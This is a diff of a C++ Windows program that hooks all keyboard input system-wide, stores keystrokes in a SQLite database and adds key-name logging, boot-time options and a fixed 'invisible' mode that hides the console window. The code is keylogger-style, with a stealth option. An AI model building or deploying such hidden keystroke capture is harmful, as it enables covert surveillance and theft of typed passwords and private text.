@@ -1,9 +1,12 @@
+#define UNICODE
 #include <Windows.h>
-#include <time.h>
-#include <iostream>
+#include <cstring>
 #include <cstdio>
 #include <fstream>
+#include <iostream>
+#include <sstream>
 #include <time.h>
+#include <map>
 
 #include "sqlite3.h"
 
@@ -13,9 +16,50 @@ using namespace std;
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
 #define visible // (visible / invisible)
-
+// Defines whether you want to enable or disable 
+// boot time waiting if running at system boot.
+#define bootwait // (bootwait / nowait)
+// defines which format to use for logging
+// 0 for default, 10 for dec codes, 16 for hex codex
+#define FORMAT 0
+// defines if ignore mouseclicks
+#define mouseignore
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
+
+#if FORMAT == 0
+const std::map<int, std::string> keyname{ 
+	{VK_BACK, "[BACKSPACE]" },
+	{VK_RETURN,	"\n" },
+	{VK_SPACE,	"_" },
+	{VK_TAB,	"[TAB]" },
+	{VK_SHIFT,	"[SHIFT]" },
+	{VK_LSHIFT,	"[LSHIFT]" },
+	{VK_RSHIFT,	"[RSHIFT]" },
+	{VK_CONTROL,	"[CONTROL]" },
+	{VK_LCONTROL,	"[LCONTROL]" },
+	{VK_RCONTROL,	"[RCONTROL]" },
+	{VK_MENU,	"[ALT]" },
+	{VK_LWIN,	"[LWIN]" },
+	{VK_RWIN,	"[RWIN]" },
+	{VK_ESCAPE,	"[ESCAPE]" },
+	{VK_END,	"[END]" },
+	{VK_HOME,	"[HOME]" },
+	{VK_LEFT,	"[LEFT]" },
+	{VK_RIGHT,	"[RIGHT]" },
+	{VK_UP,		"[UP]" },
+	{VK_DOWN,	"[DOWN]" },
+	{VK_PRIOR,	"[PG_UP]" },
+	{VK_NEXT,	"[PG_DOWN]" },
+	{VK_OEM_PERIOD,	"." },
+	{VK_DECIMAL,	"." },
+	{VK_OEM_PLUS,	"+" },
+	{VK_OEM_MINUS,	"-" },
+	{VK_ADD,		"+" },
+	{VK_SUBTRACT,	"-" },
+	{VK_CAPITAL,	"[CAPSLOCK]" },
+};
+#endif
 HHOOK _hook;
 
 // This struct contains the data received by the hook callback. As you see in the callback function
@@ -29,7 +73,7 @@ bool keep_running = true;
 
 const int R_INTERVAL = 20;
 
-// This is the callback function. Consider it the event that is raised when, in this case, 
+// This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -40,7 +84,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			
+
 			// save to file
 			incStrokeCount(kbdStruct.vkCode);
 		}
@@ -58,7 +102,9 @@ void SetHook()
 	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
-		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+		LPCWSTR a = L"Failed to install hook!";
+		LPCWSTR b = L"Error";
+		MessageBox(NULL, a, b, MB_ICONERROR);
 	}
 }
 
@@ -105,13 +151,14 @@ int incStrokeCount(int key_stroke)
 
 void Stealth()
 {
-	#ifdef visible
-		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-	#endif // visible
+#ifdef visible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+#endif
 
-	#ifdef invisible
-		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-	#endif // invisible
+#ifdef invisible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
+#endif
 }
 
 void FileTimeToTimeT(time_t& t, FILETIME ft) {
@@ -239,13 +286,7 @@ int main()
   create_db();
   thread = CreateThread(NULL, 0, reporter, &rank, 0, &tid);
 
-	// visibility of window
-	Stealth();
-
-	// Set the hook
-	SetHook();
-
-	// loop to keep the console application running.
+  // loop to keep the console application running.
   /*std::string line;
 	while (keep_running) {
       std::getline(std::cin, line);
